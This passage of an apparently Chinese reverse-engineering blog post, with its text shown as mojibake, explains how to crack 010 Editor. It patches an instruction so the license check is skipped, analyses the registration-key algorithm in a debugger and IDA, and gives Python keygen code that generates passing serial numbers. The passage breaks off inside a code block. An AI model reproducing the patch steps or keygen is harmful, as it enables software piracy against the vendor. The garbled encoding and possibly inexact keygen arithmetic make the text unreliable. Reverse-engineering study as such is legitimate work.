src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/14.png"></p><p>è·³åˆ°0x1402B48DCå¤„ï¼Œæ­¤å¤„å¯¹eaxè¿›è¡Œä¸€ä¸ªèµ‹å€¼ï¼Œèµ‹å€¼ç»“æŸåç›´æ¥å‡½æ•°ç»“æŸäº†ã€‚ç„¶åå›åˆ°åˆšåˆšçš„é‚£ä¸ªå‡½æ•°ä¸­ï¼Œå¼€å§‹è¿›è¡Œå¯¹æ¯”è·³è½¬ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/15.png"></p><p>ç”±äºæˆ‘ä»¬éœ€è¦EBXçš„å€¼ä¸º0xDBï¼Œè€Œ<code>EBX=EAX</code>ï¼ŒEAXçš„å€¼åˆæ˜¯010Editor.1402B4820å‡½æ•°è¿”å›çš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨0x1402B48DCå¤„å°†åŸæœ¬çš„<code>mov eax,177</code>æ›´æ”¹ä¸º<code>mov eax,DB</code>ï¼Œè¿™æ ·å°±å¯ä»¥æ»¡è¶³<code>EBX=0xDB</code>ã€‚OKï¼Œé€‰ä¸­è¯¥è¡Œ-ç©ºæ ¼ï¼Œç„¶åå°†0x177æ›´æ”¹ä¸º0xDBï¼Œç„¶åç¡®å®š</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/16.png"></p><p>æ›´æ”¹å®Œä¹‹åè®©ç¨‹åºè·‘èµ·æ¥ï¼Œæ˜¾ç¤ºæˆåŠŸ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/17.png"></p><p>å†å°†ä¿®æ”¹ä¹‹åç¨‹åºè¿›è¡Œæ‰“åŒ…ï¼Œä¿å­˜åˆ°010Editorçš„å®‰è£…ç›®å½•ä¸­ï¼Œå°è¯•æ‰“å¼€ï¼Œèƒ½å¤Ÿå‘ç°å·²ç»ä¸å†éœ€è¦Check Licenseäº†</p><h4 id="3-ç®—æ³•åˆ†æ"><a href="#3-ç®—æ³•åˆ†æ" class="headerlink" title="3.ç®—æ³•åˆ†æ"></a>3.ç®—æ³•åˆ†æ</h4><p>é€šè¿‡å‰é¢çš„ç ´è§£è¿‡ç¨‹ï¼ŒåŸºæœ¬å¯ä»¥åˆ¤å®šç¡®å®šESIå’ŒEBXå€¼çš„é‚£ä¸¤ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬æƒ³è¦æ‰¾çš„æ³¨å†Œç®—æ³•å‡½æ•°ï¼Œæ‰€ä»¥åé¢å°†ç€é‡åˆ†æè¿™ä¸¤ä¸ªå‡½æ•°çš„å†…å®¹ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/18.png"></p><p>é¦–å…ˆå¯¹010editor.13F0C3F99è¿›è¡Œåˆ†æï¼Œæ­¤å¤„è°ƒç”¨çš„æ˜¯010Editor.140AB3F20å‡½æ•°ï¼Œåˆæ­¥åˆ†æåï¼Œå¾—å‡ºè¯¥å‡½æ•°ï¼Œå…ˆå¯¹è¾“å…¥åšäº†ç©ºæ£€æŸ¥ï¼Œç„¶åè¯»å–nameå’Œpasswordï¼Œå°†passwordå˜ä¸º16è¿›åˆ¶å¹¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/19.png"></p><p>å­˜å‚¨ä¸º16è¿›åˆ¶ä¹‹åï¼ŒåŸæœ¬è¾“å…¥çš„20ä½æ³¨å†Œç ç°åœ¨å°±ç›¸å½“äºæ˜¯10ç»„æ•°æ®ï¼Œå°†å…¶çœ‹æˆä¸€ä¸ªæ•°ç»„k[10]ã€‚ç»§ç»­å¾€ä¸‹ï¼Œç¨‹åºè¯»å–äº†å‡ ç»„æ•°æ®å‡†å¤‡è¿›è¡Œè¿ç®—ã€‚ç„¶åå¯¹k[3]ä½ç½®çš„å€¼è¿›è¡Œäº†ä¸€ä¸ªä¸‰æ¬¡æ¯”è¾ƒã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/20.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/21.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/22.png"></p><p>æ‰€ä»¥å¯ä»¥çŒœæµ‹k[3]ä½ç½®å¤„å­˜æ”¾çš„æ˜¯ä¸€ä¸ªæ³¨å†Œç çš„ç‰ˆæœ¬ï¼Œåˆ†åˆ«å¯¹åº”0x9Cã€0xFCã€0xACè¿™ä¸‰ä¸ªç‰ˆæœ¬ï¼Œæ­¤å¤„é€‰ç”¨0x9Cè¿™ä¸ªç‰ˆæœ¬è¿›è¡Œåˆ†æï¼Œæœ‰ä¸€ä¸ªæœ‰æ„æ€çš„äº‹æƒ…æ˜¯ï¼Œå½“æŠŠk[3]ä½ç½®å¤„æ›´æ”¹ä¸º9Cæ—¶ï¼Œæ³¨å†Œç å°±å˜æˆäº†8ç»„ï¼ˆè®©ç¨‹åºå¤„äºè„±ç¦»çŠ¶æ€ï¼Œè¦ä¸ç„¶å¯èƒ½ä¼šæœ‰æ–­ç‚¹å½±å“ï¼‰</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/23.png"></p><p>è¿™é‡Œå°†æ³¨å†Œç è¾“å…¥ä¸º0123-459C-6789-ABCDï¼Œä¸ºæ–¹ä¾¿åé¢çš„åœ¨å†…å­˜ä¸­å¯»æ‰¾ï¼Œå°†ç¨‹åºè¿è¡Œï¼Œèµ°åˆ°010Editor.140AB3F20å‡½æ•°é‡Œé¢ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/24.png"></p><p>æ³¨æ„å›¾ä¸­ç®­å¤´æ‰€æŒ‡å‡½æ•°ï¼Œå½“ä»æ‰§è¡Œå®Œè¯¥å‡½æ•°åï¼Œæ³¨æ„çœ‹æ ˆç©ºé—´ï¼Œæ³¨å†Œç å·²ç»è¢«ä¿å­˜åˆ°æ ˆä¸­ï¼Œå¯ä»¥è½¬åˆ°å†…å­˜çª—å£ä¸­ç”¨äºåç»­æŸ¥çœ‹è¾“å…¥çš„æ³¨å†Œç æ˜¯å¦æœ‰å˜åŒ–ã€‚ç»§ç»­å¾€ä¸‹èµ°ï¼Œå¯¹äºä¸€äº›ä¸æ³¨å†Œç æ²¡æœ‰å…³ç³»çš„æ“ä½œå¯ä»¥é€‚å½“è¿›è¡Œå¿½ç•¥ï¼Œå› ä¸ºè®¤çœŸåˆ†æé‚£äº›å¯èƒ½æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œéœ€è¦å¯»æ‰¾å…³é”®ç‚¹è¿›è¡Œåˆ†æã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/25.png"></p><p>æœ‰ä¸ªè·³è½¬ï¼Œä½†æ˜¯è·Ÿè¿›çœ‹äº†ä¹‹åå‘ç°è·Ÿæ³¨å†Œç è²Œä¼¼æ²¡ä»€ä¹ˆå…³ç³»ï¼Œå¹¶ä¸”ç¨‹åºä¸ä¼šè·³èµ°ï¼Œä¼šç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥å¿½ç•¥ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/26.png"></p><p>è¿™é‡Œå…ˆæ˜¯å°†k[6]ã€k[5]ã€k[2]ã€k[1]ã€k[3]çš„å€¼å–å‡ºå¹¶å­˜å…¥å¯„å­˜å™¨ä¸­ï¼Œk[3]ç”¨æˆ·ç¡®å®šæ³¨å†Œç çš„ç‰ˆæœ¬ï¼Œå…¶ä½™çš„è§£ç”¨äºä¸‹é¢çš„è®¡ç®—ï¼Œåœ¨ç¡®å®šäº†æ³¨å†Œç ç‰ˆæœ¬ä¹‹åï¼Œå°†k[0]å–å‡ºå­˜å…¥ecxä¸­ï¼Œåé¢å°±æ˜¯ä¸€ç³»åˆ—çš„æ“ä½œäº†ï¼Œèµ°åˆ°ç¬¬ä¸€ä¸ªcallä½ç½®ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨IDAè¿›è¡Œåˆ†æï¼Œçœ‹çš„æ›´æ¸…æ¥šä¸€äº›ã€‚</p><p>ä½¿ç”¨IDAæ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Œè¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œxdbgæ˜¯åŠ¨æ€è°ƒè¯•ï¼ŒIDAæ˜¯é™æ€åˆ†æï¼Œæ‰€ä»¥å¯¼è‡´ç¨‹åºåœ¨ä»–ä»¬ä¸¤ä¸ªä¸­çš„åŸºå€å¯èƒ½æ˜¯ä¸ç›¸åŒçš„ï¼Œæ‰€ä»¥éœ€è¦æ›´è¯¥IDAçš„åŸºå€ï¼Œå…ˆåœ¨xdbgä¸­alt+EæŸ¥çœ‹ç¨‹åºåŸºå€</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/27.png"></p><p>å†åˆ°IDAä¸­ Edit-Segment-Rebase programï¼Œå°†åœ¨xdbgä¸­å¾—åˆ°çš„åŸºå€å¡«å…¥ç¡®å®šå°±å¯ä»¥äº†</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/28.png"></p><p>OKï¼Œå›åˆ°æ­£é¢˜ï¼ŒåŒå‡»ç¬¬ä¸€ä¸ªcallä½ç½®ï¼Œèƒ½å¤Ÿçœ‹åˆ°å‡½æ•°çœŸæ­£çš„ä½ç½®ä¸º010editor.140AB3200ï¼Œåœ¨IDAå‡½æ•°çª—å£ä¸­æœç´¢140AB3200ï¼Œç„¶åF5åç¼–è¯‘ï¼Œèƒ½å¤Ÿå‘ç°è¯¥å‡½æ•°å¾ˆç®€å•ï¼Œåªæ˜¯è¿›è¡Œäº†å¼‚æˆ–ã€åŠ çš„è¿ç®—ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯CXé€šå¸¸ç”¨æ¥ä¼ å‚ï¼Œæ‰€ä»¥a1=CXï¼Œæ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œå·²çŸ¥cl = k[0]^k[6]ï¼Œæ‰€ä»¥a1=cx=cl=k[0]^k[6]ã€‚è¿™ä¸ªå‡½æ•°ç®€å•ç‚¹è¯´å°±æ˜¯å¯¹k[0]ã€k[6]çš„ä¸€ä¸ªæ“ä½œ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/29.png"></p><p>å›åˆ°xdbgï¼Œçœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªcallå’Œç¬¬äºŒä¸ªcallä¹‹é—´çš„å†…å®¹ï¼Œå°±æ˜¯å°†å‡½æ•°çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­ï¼Œåœ¨è½¬åˆ°åœ°å€çª—å£ï¼Œåé¢ä¼šç”¨åˆ°è¿™ä¸ªå€¼ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/30.png"></p><p>ç»§ç»­å‘ä¸‹åˆ†æï¼Œçœ‹ç¬¬äºŒä¸ªcallï¼ŒåŒå‡»æŸ¥çœ‹å‡½æ•°åœ°å€ä¸º010editor.140AB3170ï¼Œç„¶åç”¨IDAæ‰¾åˆ°ï¼ŒF5åç¼–è¯‘ï¼Œå·²çŸ¥cxä½œä¸ºå‡½æ•°ä¼ å‚ï¼Œè€Œ<code>ecx=ebx=(0x100*(k[1]^k[7])+(k[2]^k[5])</code>ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæŠŠk[1]ã€k[2]ã€k[5]ã€k[7]è®¡ç®—çš„ç»“æœå¸¦å…¥è¿™ä¸ªå‡½æ•°ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/31.png"></p><p>è¯¥å‡½æ•°å°±æ˜¯å¯¹k[1]ã€k[2]ã€k[5]ã€k[7]çš„å€¼è¿›è¡Œä¸€ä¸ªè®¡ç®—ï¼Œç„¶åè®¡ç®—ä½™æ•°ï¼Œå½“ä½™æ•°ä¸º0æ—¶è¿”å›å•†ï¼Œä½™æ•°ä¸ä¸º0æ—¶è¿”å›0</p><p>çœ‹ç½‘ä¸Šçš„æ–‡ç« è¯´åˆ°è¿™é‡Œå¯ä»¥å»ºä¸€ä¸ªæ³¨å†Œæœºæ¨¡å‹ï¼Œä½†è¿˜éœ€è¦ç»§ç»­å¾€ä¸‹åˆ†æï¼Œå› ä¸ºæœ‰ä¸¤å¤„å…³é”®ç‚¹éœ€è¦è¿›è¡Œåˆ†æ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/32.png"></p><p>ç¬¬ä¸€ä¸ªå…³é”®ç‚¹æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªè·³è½¬ï¼Œè·³è½¬å‰é¢æ˜¯<code>test ebx,ebx</code>åˆ¤æ–­ebxçš„å€¼æ˜¯å¦ä¸º0ï¼Œä¸º0åˆ™è·³è½¬ã€‚è€Œebxçš„å€¼æ˜¯ç¬¬ä¸€ä¸ªcallè®¡ç®—å‡ºæ¥çš„ï¼Œæ‰€ä»¥æ­¤å¤„è¿˜ä»¥åˆ¤æ–­ç¬¬ä¸€ä¸ªcalléœ€è¦è¿”å›ä¸€ä¸ªå¤§äº0çš„å€¼ã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/33.png"></p><p>ç¬¬äºŒå¤„å…³é”®ä½ç½®æ˜¯ä¸Šå›¾ä¸­çš„<code>cmp eax 0x3E7</code>ï¼Œæ­¤å¤„éœ€è¦æ»¡è¶³eaxå¤§äº0x3E7æ‰èƒ½ä¿è¯ä¸è·³è½¬ï¼Œè€Œeaxåˆæ˜¯ç¬¬äºŒä¸ªcallè¿”å›çš„ã€‚åˆ°è¿™é‡Œåå¯ä»¥æ„å»ºä¸€ä¸ªç®€å•æ³¨å†Œæœºæ¨¡å‹ç”¨äºæ»¡è¶³jeå’Œjaè¿™ä¸¤å¤„å…³é”®çš„è·³è½¬ï¼Œè¯¥æ¨¡å‹åªæ˜¯é€šè¿‡ç©·ä¸¾çš„æ€è·¯æ¥æ»¡è¶³è·³è½¬(å‚è€ƒå¤§ä½¬çš„ï¼Œè¦æ˜¯æˆ‘è‚¯å®šæ˜¯ä»0x00è·‘åˆ°0xff)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-comment"># ä½¿ç”¨éšæœºæ•°æ¥äº§å‡ºç¬¦åˆè¦æ±‚çš„æ³¨å†Œç </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    k = [<span class="hljs-number">0x01</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0xcd</span>] <span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªé•¿åº¦ä¸º8çš„æ•°ç»„ï¼Œk[3]=0x9c</span><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        k0 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k6 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        al = (k0 ^ k6 ^ <span class="hljs-number">0x18</span> + <span class="hljs-number">0x3D</span>) ^ <span class="hljs-number">0xA7</span><br>        <span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0</span>):           <span class="hljs-comment"># æ ¹æ®jeè·³è½¬</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        k1 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k7 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k2 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br>        k5 = random.randint(<span class="hljs-number">0x00</span>,<span class="hljs-number">0xff</span>) % <span class="hljs-number">0xff</span><br><br>        esi = (<span class="hljs-number">0x100</span> * (k1 ^ k7 &amp; <span class="hljs-number">0xFF</span>) + k2 ^ k5 &amp; <span class="hljs-number">0xFF</span>) &amp; <span class="hljs-number">0xFFFF</span><br>        eax = (((esi ^ <span class="hljs-number">0x7892</span>) + <span class="hljs-number">0x4d30</span>) ^ <span class="hljs-number">0x3421</span>) &amp; <span class="hljs-number">0xffff</span><br>        <span class="hljs-keyword">if</span>(eax % <span class="hljs-number">0xb</span> ==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> eax/<span class="hljs-number">0xb</span> &lt;=<span class="hljs-number">0x3e8</span>):      <span class="hljs-comment"># æ ¹æ®jaè·³è½¬</span><br>            k[<span class="hljs-number">1</span>] = k1<br>            k[<span class="hljs-number">7</span>] = k7<br>            k[<span class="hljs-number">2</span>] = k2<br>            k[<span class="hljs-number">5</span>] = k5<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%x%x-%x%x-%x%x-%x%x&quot;</span>%(k[<span class="hljs-number">0</span>],k[<span class="hljs-number">1</span>],k[<span class="hljs-number">2</span>],k[<span class="hljs-number">3</span>],k[<span class="hljs-number">4</span>],k[<span class="hljs-number">5</span>],k[<span class="hljs-number">6</span>],k[<span class="hljs-number">7</span>]))<br><br><span class="hljs-keyword">if</span>(__name__ == <span class="hljs-string">&quot;__main__&quot;</span>):<br>    main()<br></code></pre></td></tr></table></figure><p>ç»§ç»­å¾€ä¸‹åˆ†æï¼Œå°†ç¨‹åºè¿è¡Œåˆ°<code>cmp eax 0x3E7</code>ä½ç½®ï¼Œä¿®æ”¹eaxçš„å€¼ï¼Œä¿è¯ä¸‹é¢çš„jaä¸è·³è½¬ï¼Œç„¶åä¸€ç›´å¾€ä¸‹èµ°ï¼Œèµ°åˆ°å¦‚ä¸‹å›¾ä½ç½®ï¼Œè¯»å–ç”¨æˆ·åï¼Œå› ä¸ºåœ¨ä¸Šé¢å¯¹æ³¨å†Œç è®¡ç®—æ—¶ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·åè¿›è¡Œä»»ä½•æ“ä½œï¼Œæ‰€ä»¥æ¥ä¸‹æ¥åº”è¯¥æ˜¯å¯¹ç”¨æˆ·åè¿›è¡Œä¸€ä¸ªæ“ä½œäº†ã€‚åŒæ—¶è¦æ³¨æ„æ¥ä¸‹æ¥çš„callï¼Œä¸‹é¢çš„å¯èƒ½æ˜¯å¯¹ç”¨æˆ·åè¿›è¡Œä¸€ä¸ªæ“ä½œã€‚</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/34.png"></p><p>è·Ÿè¿›ï¼Œæ­¥å…¥å‡½æ•°ï¼ŒåŒæ—¶ä½¿ç”¨IDAæŸ¥çœ‹è¯¥å‡½æ•°ï¼Œå‘ç°è¯¥å‡½æ•°å…±æ¥æ”¶4ä¸ªå‚æ•°ï¼Œè¿™é‡Œå¯ä»¥å›çœ‹ä¸€ä¸‹ä¸Šé¢çš„åœ¨è¿›å…¥<code>call 010editor.13FF97FD6</code>ä¹‹å‰ï¼Œå…ˆåå‘rcx,rd9,rd8,edxä¸­ä¼ å…¥å‚æ•°ã€‚</p><p>å·²çŸ¥åœ¨64ä½æ±‡ç¼–ä¸­ï¼Œå½“å‚æ•°å°‘äº7ä¸ªæ—¶ï¼Œ å‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: rdi, rsi, rdx, rcx, r8, r9ï¼Œæ‰€ä»¥è¿™é‡Œå‘è¿™å››ä¸ªå¯„å­˜å™¨ä¼ å…¥çš„å€¼ï¼Œå°±æ˜¯ä¼ è¿›çš„å‚æ•°ï¼Œä½†æ˜¯è¿™é‡ŒIDAåç¼–è¯‘å‡ºæ¥çš„ç»“æœï¼Œé¡ºåºå¥½åƒæœ‰ç‚¹å¯¹ä¸ä¸Š</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/35.png"></p><p>ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå¯ä»¥å¯¹ç…§xdbgï¼Œåˆ¤æ–­å‡ºa1,a2,a3,a4çš„å€¼</p><p>è¿™é‡Œå…ˆçœ‹ä¸€ä¸‹ä¼ å…¥å„ä¸ªå¯„å­˜å™¨çš„å€¼</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/36.png"></p><p>è¿›è¿‡å¯¹æ¯”åˆ†æåå¾—å‡º</p><blockquote><p>a1=ç”¨æˆ·å</p><p>a2=1</p><p>a3=0</p><p>a4=å•†ï¼Œä¹Ÿå°±æ˜¯å‰é¢ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼</p></blockquote><p>ç»§ç»­å¾€ä¸‹åˆ†æï¼Œè¯¥å‡½æ•°å…ˆæ˜¯è®¡ç®—äº†ä¸€ä¸‹ç”¨æˆ·åçš„é•¿åº¦ï¼Œè‹¥ç”¨æˆ·åé•¿åº¦ä¸ä¸º0åˆ™å¯¹ä¸€äº›å˜é‡è¿›è¡Œèµ‹å€¼æ“ä½œ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/37.png"></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/38.png"></p><p>è¿™é‡Œï¼Œå°±æ˜¯æ ¹æ®ç”¨æˆ·åã€å†é…åˆä¸Šdword_1420750E0è¿™ä¸ªæ•°æ®è¿›è¡Œä¸€ä¸ªè®¡ç®—ï¼Œå°†å€¼ä¿å­˜åˆ°v4ä¸­ï¼Œç„¶åè¿”å›ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹dword_1420750E0è¿™ä¸ªæ•°ç»„ï¼Œæ²¡å•¥çœ‹çš„ï¼Œä¸€å †æ•°å­—</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/39.png"></p><p>è¿™é‡Œéœ€è¦åšçš„æ˜¯å¯¼å‡ºè¿™æ®µæ•°æ®ï¼Œå› ä¸ºæ¥ä¸‹æ¥è®¡ç®—æ³¨å†Œç æ—¶ä¸€å®šèƒ½å¤Ÿä½¿ç”¨åˆ°ã€‚è¿™é‡Œçœ‹ç½‘ä¸Šçš„æ˜¯ç”¨ODæ’ä»¶å¯¼å‡ºï¼Œå¯¼å‡ºçš„æ•°æ®å¾ˆå®Œç¾ï¼Œå¥ˆä½•æˆ‘çš„ODç”¨ä¸äº†ï¼ŒæŒ‚è½½ä¸äº†010Editorçš„ç¨‹åºï¼Œæ‰€ä»¥åªèƒ½è¢«è¿«ä½¿ç”¨IDA,å¯¼å‡ºæ•°æ®ï¼Œå¯¼å‡ºçš„æ•°æ®æ˜¯10è¿›åˆ¶çš„ï¼Œç„¶åè¿˜æœ‰ç‚¹ä¸å®Œç¾ï¼Œä¸è¿‡ä¸å½±å“ï¼Œç¨å¾®æ›´æ”¹ä¸€ä¸‹å°±å¯ä»¥ç”¨äº†ï¼Œé€‰ä¸­è¯¥æ•°æ®ï¼Œshift+eï¼Œå¯¼å‡ºæ•°æ®å³å¯</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/40.png"></p><p>ç»§ç»­å¾€ä¸‹èµ°ï¼Œè¯¥å‡½æ•°æ ¹æ®ç”¨æˆ·åå’Œå•†è®¡ç®—å‡ºä¸€ä¸ªå€¼ï¼Œç„¶åä¸è¾“å…¥çš„æ³¨å†Œç çš„k[4]ã€k[5]ã€k[6]ã€k[7]æ¯”è¾ƒï¼Œåé¢å°†k[0]å’Œçœ‹k[6]çš„è®¡ç®—ç»“æœä¸0xAè¿›è¡Œäº†ä¸€ä¸ªæ¯”è¾ƒ<code>cmp eax,dword ptr ds:[rdi+2C]</code></p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/41.png"></p><p>æ‰€ä»¥å°±éœ€è¦ä¿®æ”¹åˆšåˆšçš„æ³¨å†Œæœºæ¨¡å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0</span>):           <span class="hljs-comment"># æ ¹æ®jeè·³è½¬</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br>            <br><span class="hljs-comment"># æ›´æ”¹ä¸º</span><br><span class="hljs-keyword">if</span>(al&gt;<span class="hljs-number">0xA</span>):           <span class="hljs-comment"># æ ¹æ®jbeè·³è½¬</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå¯ä»¥å¯¹æ³¨å†Œæœºç¼–å†™ï¼Œå…ˆæ‹ä¸€ä¸‹æ€è·¯ï¼Œè¦æ˜¯æ€è·¯è¿˜ä¸æ¸…æ™°ï¼Œå¯ä»¥å†å¤šèµ°å‡ éç¨‹åº</p><blockquote><p>ç¨‹åºå…ˆå¯¹k[0]å’Œk[6]è¿›è¡Œä¸€ä¸ªè®¡ç®—å¤„ç†</p><p>å†å¯¹k[1]ã€k[2]ã€k[5]ã€k[7]è®¡ç®—å¾—å‡ºä¸€ä¸ªå•†</p><p>ç„¶åæ ¹æ®å•†ã€ç”¨æˆ·åã€å’Œå†…å­˜ä¸­çš„ä¸€ä¸ªæ•°ç»„è®¡ç®—å‡ºk[4]ã€k[5]ã€k[6]ã€k[7]çš„å€¼</p><p>è®¡ç®—å‡ºçš„å€¼ï¼Œå†ä¸è¾“å…¥çš„æ³¨å†Œç è¿›è¡Œæ¯”è¾ƒï¼Œæ¯”è¾ƒæˆåŠŸåˆ™æˆåŠŸ</p></blockquote><p>æ³¨å†Œæœºç¼–å†™æ€è·¯ï¼š</p><blockquote><p>å…ˆéšæœºå–ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„å•†</p><p>æ ¹æ®å•†ä¸ç”¨æˆ·åè®¡ç®—å‡ºæ³¨å†Œç çš„åå››ä½</p><p>å†æ ¹æ®å•†åæ¨å‡ºk[1]å’Œk[2]</p><p>æœ€åå†æ ¹æ®k[6]å–ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„k[0]</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 